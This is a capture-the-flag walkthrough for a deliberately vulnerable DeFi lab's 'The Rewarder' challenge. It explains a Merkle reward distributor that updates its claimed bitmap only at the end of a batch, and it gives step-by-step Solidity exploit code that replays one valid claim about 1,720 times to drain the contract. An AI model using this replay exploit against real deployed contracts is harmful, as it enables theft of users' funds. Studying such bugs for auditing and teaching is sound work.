## Challenge 5 Walkthrough: The Rewarder

### Vulnerability

The vulnerability lies in `TheRewarderDistributor.claimRewards()`'s delayed state update:

```solidity
for (uint256 i = 0; i < inputClaims.length; i++) {
    // ...verifies Merkle proof and transfers tokens for each claim...
    
    // State update only happens on the LAST claim for each token batch:
    if (i == inputClaims.length - 1) {
        if (!_setClaimed(token, amount, wordPosition, bitsSet))
            revert AlreadyClaimed();
    }
}
```

- `_setClaimed()` writes to the "already claimed" bitmap **only after the entire array is processed**, not per individual claim
- Merkle proof verification passes for every copy of the same valid claim — the proof itself is valid, only the bitmap prevents replay
- Since the bitmap isn't updated until the last item, all intermediate transfers succeed before any replay protection fires
- A player with a valid claim can submit it hundreds of times in a single transaction, draining the distributor before the bitmap catches up

### Exploit

The player's address `0x44E97aF4418b7a17AABD8090bEA0A471a366305C` is at **index 188** in both distribution files, confirmed in the JSON data:
- DVT claim amount: `11,524,763,827,831,882`
- WETH claim amount: `1,171,088,749,244,340`

These small individual amounts are what make the attack viable — each fits into the total distribution balance hundreds of times.

#### Step 1 — Load Merkle Leaves

```solidity
bytes32[] memory dvtLeaves  = _loadRewards("/test/the-rewarder/dvt-distribution.json");
bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
```

Loads all 1,000 beneficiary entries from both JSON files to reconstruct the Merkle tree, enabling valid proof generation for any index.

#### Step 2 — Calculate Number of Repeated Claims

```solidity
uint256 dvtClaims  = dvt.balanceOf(address(distributor))  / playerDvtAmount;
uint256 wethClaims = weth.balanceOf(address(distributor)) / playerWethAmount;
```

Uses **actual remaining balances** post-Alice's claim rather than the original totals. Both approaches work:

| Method | Value | Behaviour |
|--------|-------|-----------|
| `balanceOf(distributor) / amount` | ~865 DVT + ~852 WETH | Reads real state after Alice — more precise |
| `TOTAL_DISTRIBUTION / amount` | ~867 DVT + ~853 WETH | Slightly overestimates but still drains below threshold |

The goal is reducing the distributor below `1e16` DVT and `1e15` WETH — not draining to exactly zero — so either works. The `balanceOf` approach is more robust since it reflects actual on-chain state regardless of prior claims.

#### Step 3 — Build ~1,720 Identical Claims

```solidity
Claim[] memory claims = new Claim[](totalClaims);
for (uint256 i = 0; i < totalClaims; i++) {
    if (i < dvtClaims) {
        claims[i] = Claim({
            batchNumber: 0,
            amount: playerDvtAmount,
            tokenIndex: 0,
            proof: merkle.getProof(dvtLeaves, 188)
        });
    } else {
        claims[i] = Claim({
            batchNumber: 0,
            amount: playerWethAmount,
            tokenIndex: 1,
            proof: merkle.getProof(wethLeaves, 188)
        });
    }
}
```

Every claim in the array is structurally identical — same batch, same amount, same valid Merkle proof for index 188. First all DVT claims fill the front of the array, then all WETH claims.

#### Step 4 — Submit All Claims in One Transaction

```solidity
distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
```

The contract processes all ~1,720 transfers before the bitmap is written once at the end. The distributor is drained in a single call.

#### Step 5 — Transfer to Recovery

```solidity
dvt.transfer(recovery, dvt.balanceOf(player));
weth.transfer(recovery, weth.balanceOf(player));
```

### Why It Works

The root cause is treating claim validation as a batch-level concern rather than a per-claim concern. A correct implementation would call `_setClaimed()` before each individual transfer — checking and writing the bitmap atomically per claim. Instead, the contract verifies the Merkle proof per item but defers the write until the batch ends, creating a window where the same valid proof can be replayed arbitrarily many times within that single call.

This is an **intra-transaction replay attack via delayed state write** — the attacker never leaves the transaction, so the bitmap is never read as "claimed" during any of the ~1,720 iterations. One valid proof, hundreds of payouts, one bitmap write at the very end.
